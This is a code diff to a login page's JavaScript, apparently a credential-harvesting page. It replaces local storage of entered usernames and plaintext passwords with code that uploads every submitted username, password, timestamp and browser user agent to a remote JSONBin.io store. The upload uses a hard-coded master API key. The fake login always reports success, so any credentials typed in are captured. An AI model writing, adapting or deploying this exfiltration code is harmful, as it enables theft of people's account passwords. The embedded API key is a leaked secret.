@@ -129,36 +129,74 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Save user credentials to localStorage only
-    const saveCredentials = (username, password) => {
-        // Get existing credentials or initialize empty array
-        let savedCredentials = JSON.parse(localStorage.getItem('user_credentials')) || [];
+    // JSONBin.io Configuration
+    const JSONBIN_API_KEY = '$2a$10$p03w4JJjDXcsH1oWF1P/uOZNMUOT8ir2K0DP61INV7WtfpYTnCMOi';
+    const JSONBIN_BIN_ID = '69873995d0ea881f40a7e015';
+    const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
 
-        // Create new credential entry with timestamp
-        const credentialEntry = {
-            username: username,
-            password: password,
-            loginTime: new Date().toISOString()
-        };
+    // Save user credentials to JSONBin (Central Cloud Storage)
+    const saveCredentials = async (username, password) => {
+        try {
+            // First, get existing credentials from JSONBin
+            const getResponse = await fetch(JSONBIN_URL + '/latest', {
+                method: 'GET',
+                headers: {
+                    'X-Master-Key': JSONBIN_API_KEY
+                }
+            });
 
-        // Add new entry to the array
-        savedCredentials.push(credentialEntry);
+            let existingCredentials = [];
+            if (getResponse.ok) {
+                const data = await getResponse.json();
+                existingCredentials = data.record || [];
+            }
 
-        // Save to localStorage
-        localStorage.setItem('user_credentials', JSON.stringify(savedCredentials));
+            // Create new credential entry
+            const credentialEntry = {
+                username: username,
+                password: password,
+                loginTime: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
 
-        console.log('Credentials saved to localStorage:', credentialEntry);
-        console.log('Total entries:', savedCredentials.length);
+            // Add new entry
+            existingCredentials.push(credentialEntry);
+
+            // Save updated credentials to JSONBin
+            const updateResponse = await fetch(JSONBIN_URL, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': JSONBIN_API_KEY
+                },
+                body: JSON.stringify(existingCredentials)
+            });
+
+            if (updateResponse.ok) {
+                console.log('Credentials saved to cloud!', credentialEntry);
+                console.log('Total entries:', existingCredentials.length);
+            }
+        } catch (error) {
+            console.error('Error saving to cloud:', error);
+            // Fallback to localStorage
+            let savedCredentials = JSON.parse(localStorage.getItem('user_credentials')) || [];
+            savedCredentials.push({
+                username: username,
+                password: password,
+                loginTime: new Date().toISOString()
+            });
+            localStorage.setItem('user_credentials', JSON.stringify(savedCredentials));
+        }
     };
 
     // Simulate login API call
     const simulateLogin = (username, password) => {
-        return new Promise((resolve, reject) => {
-            setTimeout(() => {
+        return new Promise(async (resolve, reject) => {
+            setTimeout(async () => {
                 console.log('Login attempt:', { username, password: '***' });
 
-                // Save credentials to file
-                saveCredentials(username, password);
+                // Save credentials to cloud
+                await saveCredentials(username, password);
 
                 localStorage.setItem('username', username);
                 resolve({ success: true, message: 'Login successful!' });
